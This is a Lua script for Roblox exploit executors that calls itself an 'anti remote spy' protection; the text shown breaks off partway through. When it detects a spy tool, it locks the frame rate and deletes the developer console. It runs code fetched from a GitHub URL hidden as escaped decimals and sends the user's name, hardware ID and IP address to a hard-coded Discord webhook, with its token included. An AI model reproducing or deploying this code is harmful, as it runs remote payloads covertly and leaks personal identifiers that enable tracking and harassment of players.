getgenv().webhookLogs = true -- if you want to log the ppl that tries to steal your remotes
getgenv().webhook = "https://discord.com/api/webhooks/1027839855323000875/Z7WTAX2HAWV7twV6QTm5oVPStD7uKwPIYdZsRGLxK4YRdowckcbLzqOuiRGWcGthAnlC" -- webhookLogs must be true
getgenv().globalLogs = false -- posts the skid that who tryed to log the remotes in our public server
getgenv().fpsPunishment = 10 -- sets and locks the fps when a skid uses remote spy (lower = much more lag)
--SECURITY--
local res =
    (request or http_request or syn.request or http.request)(
    {
        Url = "https://api.luauth.xyz/hwid",
        Method = "GET"
    }
)

-- Variables
local globalWebhook =
    "https://discord.com/api/webhooks/1027839855323000875/Z7WTAX2HAWV7twV6QTm5oVPStD7uKwPIYdZsRGLxK4YRdowckcbLzqOuiRGWcGthAnlC"
local CoreGui = game:GetService("CoreGui")
local plr = game:GetService("Players").LocalPlayer
local devconsole = CoreGui:WaitForChild("DevConsoleMaster")
_G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
    true

game:GetService("RunService").RenderStepped:Connect(
    function()
        if
            _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx ==
                true
         then
            -- HTTP Spy
            if islclosure(syn.request) then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible HTTP Spy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible HTTP Spy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end
            -- Turtle RemoteSpy
            if CoreGui:FindFirstChild("TurtleSpyGUI") then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- EngoSpy RemoteSpy
            if CoreGui:FindFirstChild("engospy v1.02") or getgenv().engospy == true or getgenv().engospy == false then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- Mr.Spy RemoteSpy
            if CoreGui:FindFirstChild("Mr.Spy V2 - Rebug") then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- FrostHook RemoteSpy
            if getgenv().FrostHookSpy == true or getgenv().FrostHookSpy == false then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- FrontEnd RemoteSpy
            if CoreGui:FindFirstChild("RemoteSpy") then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- CheatBlox RemoteSpy
            if getgenv().CheatBloxRunning == true then
